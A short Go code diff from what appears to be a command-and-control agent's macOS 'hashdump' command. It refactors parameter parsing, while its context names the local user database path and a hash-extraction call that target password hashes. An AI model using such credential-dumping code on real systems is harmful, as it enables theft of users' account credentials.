@@ -27,11 +27,9 @@ type hashdumpDarwinArgs struct {
 const dsLocalUsersPath = "/var/db/dslocal/nodes/Default/users"
 
 func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
-	var args hashdumpDarwinArgs
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Error parsing parameters: %v", err)
-		}
+	args, parseErr := unmarshalParams[hashdumpDarwinArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	entries, err := extractDarwinHashes()
